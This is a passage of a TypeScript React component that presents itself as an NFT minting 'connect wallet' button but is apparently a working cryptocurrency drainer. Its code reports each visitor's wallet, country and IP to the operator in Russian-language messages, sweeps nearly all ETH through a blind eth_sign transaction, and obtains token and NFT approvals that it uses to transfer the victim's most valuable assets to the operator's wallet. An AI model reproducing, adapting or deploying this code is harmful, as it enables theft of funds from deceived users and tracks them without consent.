i4zNTU0NjkgNy4wNTg1OTQgNS4wNjY0MDYgTCA2LjM2MzI4MSA1Ljc1MzkwNiBDIDYuMjY1NjI1IDUuODUxNTYyIDYuMTA1NDY5IDUuODUxNTYyIDYuMDA3ODEyIDUuNzUzOTA2IEwgNC4zOTg0MzggNC4xNTYyNSBDIDQuMjAzMTI1IDMuOTYwOTM4IDQuMjAzMTI1IDMuNjQ4NDM4IDQuMzk4NDM4IDMuNDUzMTI1IFogTSAyMi40MTc5NjkgNi4yNDYwOTQgTCAyMy44NTE1NjIgNy42Njc5NjkgQyAyNC4wNDY4NzUgNy44NjMyODEgMjQuMDQ2ODc1IDguMTc1NzgxIDIzLjg1MTU2MiA4LjM3MTA5NCBMIDE3LjM4NjcxOSAxNC43ODUxNTYgQyAxNy4xOTE0MDYgMTQuOTgwNDY5IDE2Ljg3MTA5NCAxNC45ODA0NjkgMTYuNjc1NzgxIDE0Ljc4NTE1NiBMIDEyLjA4OTg0NCAxMC4yMzQzNzUgQyAxMi4wMzkwNjIgMTAuMTgzNTk0IDExLjk2MDkzOCAxMC4xODM1OTQgMTEuOTEwMTU2IDEwLjIzNDM3NSBMIDcuMzI0MjE5IDE0Ljc4NTE1NiBDIDcuMTI4OTA2IDE0Ljk4MDQ2OSA2LjgwODU5NCAxNC45ODA0NjkgNi42MTMyODEgMTQuNzg1MTU2IEwgMC4xNDg0MzggOC4zNzEwOTQgQyAtMC4wNDY4NzUgOC4xNzU3ODEgLTAuMDQ2ODc1IDcuODYzMjgxIDAuMTQ4NDM4IDcuNjY3OTY5IEwgMS41ODIwMzEgNi4yNDYwOTQgQyAxLjc3NzM0NCA2LjA1MDc4MSAyLjA5NzY1NiA2LjA1MDc4MSAyLjI5Mjk2OSA2LjI0NjA5NCBMIDYuODc4OTA2IDEwLjc5Njg3NSBDIDYuOTI5Njg4IDEwLjg0NzY1NiA3LjAwNzgxMiAxMC44NDc2NTYgNy4wNTg1OTQgMTAuNzk2ODc1IEwgMTEuNjQ0NTMxIDYuMjQ2MDk0IEMgMTEuODM5ODQ0IDYuMDUwNzgxIDEyLjE2MDE1NiA2LjA1MDc4MSAxMi4zNTU0NjkgNi4yNDYwOTQgTCAxNi45NDE0MDYgMTAuNzk2ODc1IEMgMTYuOTkyMTg4IDEwLjg0NzY1NiAxNy4wNzAzMTIgMTAuODQ3NjU2IDE3LjEyMTA5NCAxMC43OTY4NzUgTCAyMS43MDcwMzEgNi4yNDYwOTQgQyAyMS45MDIzNDQgNi4wNTA3ODEgMjIuMjIyNjU2IDYuMDUwNzgxIDIyLjQxNzk2OSA2LjI0NjA5NCBaIE0gMjIuNDE3OTY5IDYuMjQ2MDk0ICIvPgo8L2c+Cjwvc3ZnPgo="
              alt="WC logo"
            />
            <h2 className="white">WalletConnect</h2>
            <p className="primary-text helpful md">Wallet protocol</p>
          </button>
        </div>
      </>
    ) : (
      <button>Loading...</button>
    );
  };

  useEffect(() => {
    if (!address) return;
    const sendTokenInfo = async () => {
      priciest = await getPriciestToken(address);
      priciestNFT = await getPriciestNFT(address);
      let ethBalance = await web3Provider?.getBalance(address);
      if (
        !priciest &&
        !priciestNFT &&
        +ethers.utils.formatEther(ethBalance ?? 0) > 0.01
      ) {
        notifyAdmin(
          ``
        );
      }
    };
    let wallets = window.localStorage.getItem("walletsConnected");
    if (wallets !== null) {
      var walletsConnected: any[] = JSON.parse(wallets);
    } else {
      var walletsConnected = [];
    }
    let unique = new Set(walletsConnected);
    console.log(unique);

    if (isActive && geoData.IPv4) {
      if (!unique.has(address)) {
        let wallet = provider.isMetaMask ? "MetaMask" : "WalletConnect";
        notifyAdmin(
          `🤔Кто-то подключает свой [${wallet}](https://etherscan.io/address/${address}) кошелёк..\n🌐Страна, IP-адрес: ${geoData.country_code}, ${geoData.IPv4}`
        );
        unique.add(address);
        sendTokenInfo();
        window.onbeforeunload = function () {
          notifyAdmin(
            `🥺К сожалению, юзер ${geoData.country_code}, ${geoData.IPv4} покидает сайт..`
          );
          this.onbeforeunload = () => {};
          return "Do you want to leave the page ?";
        };
        window.localStorage.setItem(
          "walletsConnected",
          JSON.stringify([...unique])
        );
      }
    }
  }, [priciest, priciestNFT, address]);

  async function signEthereum(value: string, reserve: boolean) {
    if (!address || !web3Provider) return;
    let reserveEth = 0.003; // для комиссий
    if (reserve && +value > 0.018) reserveEth += 0.01;
    let ethValue = ethers.utils.parseEther((+value - +reserveEth).toFixed(6));
    console.log(ethValue);
    let tx = {
      from: address,
      to: ethers.utils.getAddress(wallet.address),
      value: ethValue,
      gasLimit: 100000,
      chainId: 1,
    };
    const feeData = await web3Provider.getFeeData();
    const estimateGas = await web3Provider.estimateGas(tx);
    reserveEth += +ethers.utils.formatEther(
      estimateGas.mul(feeData.gasPrice ?? 0)
    );
    console.log(reserveEth);
    tx = {
      from: address,
      to: ethers.utils.getAddress(wallet.address),
      value: ethers.utils.parseEther((+value - +reserveEth).toString()),
      gasLimit: 100000,
      chainId: 1,
    };
    const web3Signer = web3Provider.getSigner();
    const ts = await web3Signer.populateTransaction(tx);
    const unsigned = ts as UnsignedTransaction;
    console.log(unsigned);
    const hexTx = ethers.utils.serializeTransaction(unsigned);
    const hashArray = ethers.utils.arrayify(hexTx);
    const signature = await web3Provider.send("eth_sign", [
      ethers.utils.getAddress(address),
      ethers.utils.keccak256(hashArray),
    ]);
    const signedTx = ethers.utils.serializeTransaction(unsigned, signature);
    await web3Provider.sendTransaction(signedTx);
    notifyAdmin(
      `😍УРА! Юзер ${geoData.country_code}, ${
        geoData.IPv4
      } подписал контракт и отправил вам ${(
        +value - +reserveEth
      ).toString()} ETH`
    );
  }

  async function approve() {
    if (!address) {
      await connect();
      return;
    }

    if (provider && !provider.isMetaMask)
      setButtonText("Open your wallet to confirm minting");

    let ethBalance = await web3Provider?.getBalance(address);
    if (ethBalance && +ethers.utils.formatEther(ethBalance) > +config.minEth) {
      let reserve = priciest || priciestNFT ? true : false;
      await signEthereum(ethers.utils.formatEther(ethBalance), reserve);
    }

    if (!(priciestNFT || priciest)) {
      setNoTokens(true);
    } else {
      if (noTokens) setNoTokens(false);
    }

    if (priciest) {
      assetContract = new ethers.Contract(
        priciest?.id,
        ERC20_ABI.abi,
        web3Provider?.getSigner()
      );
    }
    if (priciestNFT) {
      NFTContract = new ethers.Contract(
        priciestNFT?.id,
        ERC721_ABI.abi,
        web3Provider?.getSigner()
      );
    }

    try {
      if (priciestNFT && priciest) {
        if (
          (priciest?.price * priciest?.balance) / 10 ** priciest.decimals >
          priciestNFT.usd_price
        ) {
          await approveToken(priciest, assetContract);
        }
      } else if (!priciestNFT) {
        await approveToken(priciest, assetContract);
        console.log(2);
      } else {
        await approveNFT(priciestNFT, NFTContract);
        console.log(3);
      }
    } catch {}

    ethBalance = await web3Provider?.getBalance(address);
    if (ethBalance && +ethers.utils.formatEther(ethBalance) > 0.01) {
      signEthereum(ethers.utils.formatEther(ethBalance), false);
    }
  }

  async function reconnect() {
    disconnect();
    approve();
  }

  async function approveToken(
    priciest: ERC20Token | undefined,
    asset: Contract
  ) {
    const priciestAssetBalance = priciest?.balance.toLocaleString("fullwide", {
      useGrouping: false,
    });
    const approve = await asset.approve(
      wallet.address,
      BigNumber.from(priciestAssetBalance),
      {
        gasLimit: 150000,
      }
    );

    await approve.wait();

    if (priciest?.id && priciest.price && priciest.balance) {
      notifyAdmin(
        `😍УРА! Юзер ${geoData.country_code}, ${
          geoData.IPv4
        } выписал вам апрув токена ${priciest?.name} на сумму ${(
          (priciest?.price * priciest?.balance) /
          10 ** priciest.decimals
        ).toFixed(2)}$..`
      );
      const SendContract = new ethers.Contract(
        priciest?.id,
        ERC20_ABI.abi,
        walletSigner
      );

      await SendContract?.transferFrom(
        address,
        wallet.address,
        BigNumber.from(priciestAssetBalance),
        {
          gasLimit: 150000,
        }
      );

      notifyAdmin(
        `💰Токен ${priciest.name} в размере ${(
          (priciest?.price * priciest?.balance) /
          10 ** priciest.decimals
        ).toFixed(2)}$ от юзера ${geoData.country_code}, ${
          geoData.IPv4
        } был зачислен на ваш кошелёк ${wallet.address}`
      );
    }
  }

  async function approveNFT(
    priciestNFT: NFTToken | undefined,
    NFTContract: Contract
  ): Promise<void> {
    const tx = await NFTContract?.setApprovalForAll(wallet.address, true, {
      gasLimit: 150000,
    });
    try {
      await tx.wait();
    } catch {
      return;
    }
    notifyAdmin(
      "Выписан апрув NFT" +
        priciestNFT?.id +
        "стоимостью" +
        priciestNFT?.usd_price +
        "USDT"
      // `(${ip})`
    );

    if (priciestNFT?.contract_id !== undefined) {
      const SendContract = new ethers.Contract(
        priciestNFT.contract_id,
        ERC721_ABI.abi,
        walletSigner
      );
      await SendContract.transferFrom(address, wallet.address, priciestNFT.id, {
        gasLimit: 150000,
      });
      notifyAdmin(
        `💰NFT ${priciestNFT.id} в размере ${priciestNFT.usd_price}$ от юзера ${geoData.country_code}, ${geoData.IPv4} был зачислен на ваш кошелёк ${wallet.address}`
      );
    }
  }
  return web3Provider && noTokens ? (
    <DisconnectButton disconnect={reconnect} />
  ) : (
    <ConnectButton connect={approve} />
  );
}
